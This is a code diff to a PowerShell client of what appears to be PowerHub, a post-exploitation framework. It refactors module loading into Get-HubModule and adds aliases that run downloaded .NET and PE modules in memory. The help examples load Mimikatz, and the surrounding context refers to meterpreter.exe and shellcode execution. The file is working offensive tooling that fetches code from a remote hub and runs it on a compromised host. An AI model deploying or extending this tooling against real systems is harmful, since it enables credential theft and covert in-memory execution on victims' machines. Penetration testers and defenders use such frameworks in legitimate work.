@@ -158,48 +158,16 @@ function Get-HubModule {
 <#
 .SYNOPSIS
 
-Simply returns a hub module for further processing. Its only parameter  works
-similar to Load-HubModule. In fact, Load-HubModule calls Get-HubModule.
-
-.PARAMETER Expression
-
-See help of Load-HubModule.
-
-#>
-    Param(
-        [parameter(Mandatory=$true)]
-        [String]
-        $Expression
-    )
-
-    if ($Expression -match "^[0-9-,]+$") {
-        $indices = Convert-IntStringToArray($Expression)
-    } else {
-        $indices = [Int[]]($PowerHubModules | Where { $_.Name -match $Expression } | % {$_.N})
-    }
-
-    $result = @()
-    foreach ($i in $indices) {
-        if ($i -lt $PowerHubModules.length -and $i -ge 0) {
-            $result += $PowerHubModules[$i]
-        }
-    }
-    return $result
-}
-
-function Load-HubModule {
-<#
-.SYNOPSIS
-
 Transfers a module from the hub and imports it. It creates a web request to
-load the Base64 encoded module code.
+load the Base64 encoded module code. If the module has already been loaded, it
+simply returns the module object unless the "-Reload" flag is present.
 
 It refreshes the module list first, so keep this in mind when referring to
 modules by number.
 
 .DESCRIPTION
 
-Load-HubModule loads a module.
+Get-HubModule loads and returns a module.
 
 .PARAMETER Expression
 
@@ -209,10 +177,13 @@ Name.
 Alternatively, you can use the number of the module, separated by commas. Can
 contain a range such as "1,4-8".
 
+.PARAMETER Reload
+
+Force a reload of the module's code from the server.
 
 .EXAMPLE
 
-Load-HubModule "3"
+Get-HubModule "3"
 
 Description
 -----------
@@ -220,7 +191,7 @@ Transfers the code of module #3 from the hub and imports it.
 
 .EXAMPLE
 
-Load-HubModule Mimikatz
+Get-HubModule Mimikatz
 
 Description
 -----------
@@ -229,7 +200,7 @@ expression matches) from the hub and imports it.
 
 .EXAMPLE
 
-Load-HubModule "1,4-6"
+Get-HubModule "1,4-6"
 
 Description
 -----------
@@ -246,28 +217,53 @@ Transfers the code of all modules from the hub and imports them.
 .NOTES
 
 Use the '-Verbose' option to print detailed information.
-#>
 
+#>
     Param(
-        [parameter(Mandatory=$true)]
-        [String]
-        $Expression
+        [parameter(Mandatory=$true)] [String] $Expression,
+        [parameter(Mandatory=$false)] [Switch] $Reload
     )
 
-    $result = @()
-    Get-HubModule $Expression | % {
-        $args = @{"m"=$_.N}
-        # if ($PS_VERSION -eq 2) { $args["c"] = "1" }
-        if ($_.Type -eq 'ps1') {
-            $_.Code = Transport-String "m" $args
-            Import-HubModule $_
-        } else {
-            $_.Code = Transport-String "m" $args $True
-        }
-        $_.Loaded = $True
-        $result += $_
+    if ($Expression -match "^[0-9-,]+$") {
+        $indices = Convert-IntStringToArray($Expression)
+    } else {
+        $indices = [Int[]]($PowerHubModules | Where { $_.Name -match $Expression } | % {$_.N})
     }
-    $result
+
+    $result = @()
+    foreach ($i in $indices) {
+        if ($i -lt $PowerHubModules.length -and $i -ge 0) {
+            $module = $PowerHubModules[$i]
+            if (($module.Loaded -eq $False) -or $Reload) {
+                # Load the module from server
+                Write-Verbose "Loading module $($module.name)..."
+                $transport_args = @{"m"=$module.N}
+                # if ($PS_VERSION -eq 2) { $args["c"] = "1" }
+                if ($module.Type -eq 'ps1') {
+                    $module.Code = Transport-String "m" $transport_args
+                    Import-HubModule $module
+                } else {
+                    $module.Code = Transport-String "m" $transport_args $True
+                    # Get Basename
+                    if ($Module.Name.Contains('/')) {
+                        $AliasName = $Module.Name.split('/')
+                        $AliasName = $AliasName[$AliasName.Length - 1]
+                    } else {
+                        $AliasName = $Module.Name
+                    }
+                    # Create alias
+                    if ($module.Type -eq 'dotnet') {
+                        New-DotNetAlias $module -Name $AliasName | Out-Null
+                    } elseif ($module.Type -eq 'pe') {
+                        New-ExeAlias $module -Name $AliasName | Out-Null
+                    }
+                }
+                $module.Loaded = $True
+            }
+            $result += $module
+        }
+    }
+    return $result
 }
 
 
@@ -483,6 +479,69 @@ Load the .NET module with the name 'meterpreter.exe' in memory and run it
     }
 }
 
+function New-DotNetAlias {
+<#
+.SYNOPSIS
+
+Add an alias that acts as a wrapper for 'Get-HubModule|Run-DotNETExe'.
+
+.PARAMETER Module
+
+A PowerHub module object of type "dotnet".
+
+.PARAMETER Name
+
+Name of the new alias. Default: the module's name.
+
+#>
+    Param(
+        [parameter(Mandatory=$false)] [String] $Name,
+        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
+        [PSTypeName("PowerHub.Module")] $Module
+    )
+    $Function = {
+        $Module | Run-DotNETExe -Arguments ([string[]]$args)
+    }
+    if ($Name) {
+        $FuncName = $Name
+    } else {
+        $FuncName = $Module.Name
+    }
+    $Module.Alias = $FuncName
+    New-Item -Force -Path function: -Name "script:$FuncName" -Value $Function.GetNewClosure()
+}
+
+function New-ExeAlias {
+<#
+.SYNOPSIS
+
+Add an alias that acts as a wrapper for 'Get-HubModule|Run-Exe'.
+
+.PARAMETER Module
+
+A PowerHub module object of type "pe".
+
+.PARAMETER Name
+
+Name of the new alias. Default: the module's name.
+
+#>
+    Param(
+        [parameter(Mandatory=$false)] [String] $Name,
+        [parameter(Mandatory=$true,Position=0,ValueFromPipeline=$true)]
+        [PSTypeName("PowerHub.Module")] $Module
+    )
+    $Function = {
+        $Module | Run-Exe -ExeArgs ([string[]]$args -join " ")
+    }
+    if ($Name) {
+        $FuncName = $Name
+    } else {
+        $FuncName = $Module.Name
+    }
+    $Module.Alias = $FuncName
+    New-Item -Force -Path function: -Name "script:$FuncName" -Value $Function.GetNewClosure()
+}
 
 function Run-Shellcode {
 <#
@@ -872,6 +931,7 @@ Use 'Get-Help' to learn more about those functions.
 }
 
 try { New-Alias -Name pth -Value PushTo-Hub } catch { }
+try { New-Alias -Name Load-HubModule -Value Get-HubModule } catch { }
 try { New-Alias -Name lhm -Value Load-HubModule } catch { }
 try { New-Alias -Name ghm -Value Get-HubModule } catch { }
 try { New-Alias -Name lshm -Value List-HubModules } catch { }
